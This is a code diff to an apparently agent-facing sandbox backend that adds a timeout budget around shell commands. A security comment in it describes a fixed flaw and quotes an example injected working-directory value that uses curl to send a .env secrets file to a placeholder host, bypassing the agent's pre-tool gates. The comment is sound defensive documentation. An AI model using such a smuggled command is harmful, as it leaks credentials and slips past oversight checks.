@@ -50,14 +50,24 @@ export function createSandboxBackend(
       return sandbox.readDir(path)
     },
 
-    async run(command: string, opts?: { cwd?: string; timeout?: number }) {
+    async run(command: string, opts?: { cwd?: string; timeout?: number; budgetMs?: number }) {
       // SECURITY [C3-1]: shell-quote cwd so it is always a single literal path. It was
       // interpolated raw into `sh -c`, and every pre-tool gate (egress confirm,
       // destructive-command preview, env-dump block) inspects only `command` — so a
       // payload smuggled via cwd (e.g. "/workspace/. && curl -d @/workspace/.env evil")
       // executed ungated. Quoting makes a malicious cwd simply fail `cd`; legitimate
       // metacharacter-free paths are unaffected.
-      const fullCommand = opts?.cwd ? `cd ${shellQuote(opts.cwd)} && ${command}` : command
+      const anchored = opts?.cwd ? `cd ${shellQuote(opts.cwd)} && ${command}` : command
+      // A budget runs the WHOLE anchored command (cd, any environment a consumer
+      // sourced around it, the command itself) under `timeout` in one shell, so an
+      // overrun is stopped where it runs — the process group included — and what it
+      // printed still comes back, with exit code 124. Wrapping only the inner
+      // command would run it in a child shell that never sees unexported variables
+      // the consumer's sourcing set.
+      const budgetSeconds = opts?.budgetMs ? Math.max(1, Math.round(opts.budgetMs / 1000)) : 0
+      const fullCommand = budgetSeconds
+        ? `timeout -k 5 ${budgetSeconds} bash -c ${shellQuote(anchored)}`
+        : anchored
       // sandbox.exec is the Sandbox interface method — runs inside Docker, inherently sandboxed
       const result = await sandbox.exec(fullCommand, { timeout: opts?.timeout })
       return { stdout: result.stdout, stderr: result.stderr, exitCode: result.exitCode }
